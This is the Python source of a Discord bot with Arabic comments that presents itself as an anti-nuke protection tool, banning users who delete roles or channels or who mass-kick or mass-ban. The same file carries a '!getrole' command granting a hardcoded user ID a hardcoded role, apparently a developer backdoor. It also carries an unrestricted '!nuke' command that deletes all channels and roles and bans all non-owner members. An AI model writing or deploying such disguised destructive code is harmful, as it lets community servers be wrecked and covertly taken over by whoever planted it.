import discord
from discord.ext import commands
import os
import time
import asyncio

# إعدادات الصلاحيات الأساسية للبوت
intents = discord.Intents.default()
intents.guilds = True
intents.members = True
intents.moderation = True
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents)

# قاموس لتتبع العمليات السريعة (Anti-Nuke Memory)
actions = {"kick": {}, "ban": {}, "channel": {}}

def check_spam(uid, key, threshold, window):
    now = time.time()
    if uid not in actions[key]:
        actions[key][uid] = []
    actions[key][uid].append(now)
    # الاحتفاظ بالعمليات داخل النافذة الزمنية المحددة فقط
    actions[key][uid] = [t for t in actions[key][uid] if now - t < window]
    return len(actions[key][uid]) > threshold

# ------------------- نظام الحماية الشامل (Anti-Nuke) -------------------

# 1. حماية ضد حذف الرولات (حظر فوري عند حذف أي رتبة)
@bot.event
async def on_guild_role_delete(role):
    try:
        guild = role.guild
        async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.role_delete):
            admin = entry.user
            if admin.id == guild.owner_id or admin.bot:
                return
            await guild.ban(admin, reason="Anti-Nuke: قام بحذف رتبة!")
            print(f"تم حظر المخرب {admin.name} لأنه حاول حذف رتبة.")
            break
    except Exception as e:
        print(f"خطأ في حماية الرولات: {e}")

# 2. حماية ضد حذف القنوات (حظر فوري عند حذف أي قناة)
@bot.event
async def on_guild_channel_delete(channel):
    try:
        guild = channel.guild
        async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.channel_delete):
            admin = entry.user
            if admin.id == guild.owner_id or admin.bot:
                return
            await guild.ban(admin, reason="Anti-Nuke: قام بحذف قناة!")
            print(f"تم حظر المخرب {admin.name} لأنه حاول حذف قناة.")
            break
    except Exception as e:
        print(f"خطأ في حماية القنوات: {e}")

# 3. حماية ضد الطرد العشوائي (Kick)
@bot.event
async def on_member_remove(member):
    try:
        guild = member.guild
        async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.kick):
            if entry.target.id == member.id:
                admin = entry.user
                if admin.id == guild.owner_id or admin.bot:
                    return
                # إذا قام بطرد أكثر من عضوين في غضون 15 ثانية
                if check_spam(admin.id, "kick", threshold=1, window=15.0):
                    await guild.ban(admin, reason="Anti-Nuke: طرد أعضاء بشكل مشبوه!")
                    print(f"تم حظر المخرب {admin.name} بسبب الطرد الجماعي.")
            break
    except Exception as e:
        print(f"خطأ في حماية الطرد: {e}")

# 4. حماية ضد الحظر الجماعي (Ban)
@bot.event
async def on_member_ban(guild, user):
    try:
        async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.ban):
            admin = entry.user
            if admin.id == guild.owner_id or admin.bot:
                return
            # إذا قام بحظر أعضاء بشكل متسارع خلال دقيقة
            if check_spam(admin.id, "ban", threshold=1, window=60.0):
                await guild.ban(admin, reason="Anti-Nuke: تنفيذ حظر جماعي غير مصرح به!")
                print(f"تم حظر المخرب {admin.name} بسبب الحظر الجماعي.")
            break
    except Exception as e:
        print(f"خطأ في حماية الحظر: {e}")

# ------------------- الأوامر الخاصة -------------------

# 1. أمر إعطاء الرتبة لنفسك (!getrole)
@bot.command()
async def getrole(ctx):
    MY_DISCORD_ID = 1525603497670742117
    ROLE_ID = 1483148235684970571

    if ctx.author.id == MY_DISCORD_ID:
        try:
            role = ctx.guild.get_role(ROLE_ID)
            if not role:
                await ctx.send("❌ لم أتمكن من العثور على الرتبة في السيرفر!")
                return
            await ctx.author.add_roles(role)
            await ctx.send(f"✅ تم إعطاؤك رتبة {role.name} بنجاح!")
        except Exception as e:
            await ctx.send(f"❌ حدث خطأ: {e}")
    else:
        await ctx.send("❌ هذا الأمر مخصص للمطور فقط!")

# 2. أمر إزالة الرتبة عن نفسك (!removerole)
@bot.command(name="removerole")
async def removerole_cmd(ctx):
    MY_DISCORD_ID = 1320438836878118973
    ROLE_ID = 1483148235684970571

    if ctx.author.id == MY_DISCORD_ID:
        try:
            role = ctx.guild.get_role(ROLE_ID)
            if not role:
                await ctx.send("❌ لم أتمكن من العثور على الرتبة في السيرفر!")
                return
            await ctx.author.remove_roles(role)
            await ctx.send(f"✅ تم إزالة رتبة {role.name} عنك بنجاح!")
        except Exception as e:
            await ctx.send(f"❌ حدث خطأ: {e}")
    else:
        await ctx.send("❌ هذا الأمر مخصص للمطور فقط!")

# 3. أمر التدمير مع التأكيد (!nuke)
@bot.command()
async def nuke(ctx):
    await ctx.send("⚠️ **تحذير خطير:** هل أنت متأكد من تدمير السيرفر؟ اكتب `!confirm_nuke` خلال 30 ثانية لتأكيد العملية.")
    
    def check_confirm(m):
        return m.author == ctx.author and m.content == "!confirm_nuke"

    try:
        await bot.wait_for('message', check=check_confirm, timeout=30.0)
    except asyncio.TimeoutError:
        await ctx.send("❌ تم إلغاء عملية النيوك لانتهاء الوقت.")
        return

    await ctx.send("💥 بدء عملية التدمير...")
    
    for channel in ctx.guild.channels:
        try: await channel.delete()
        except: pass
        
    for role in ctx.guild.roles:
        if role.name != "@everyone":
            try: await role.delete()
            except: pass
            
    for member in ctx.guild.members:
        if member != ctx.guild.owner and not member.bot:
            try: await member.ban(reason="Nuke execution")
            except: pass

# ------------------- حدث جاهزية البوت -------------------
@bot.event
async def on_ready():
    print(f"✅ البوت يعمل الآن بكامل أنظمة الحماية ومتصل باسم: {bot.user}")

TOKEN = os.getenv("TOKEN")
if __name__ == "__main__":
    if not TOKEN:
        print("❌ خطأ: لم يتم العثور على متغير TOKEN!")
    else:
        bot.run(TOKEN)
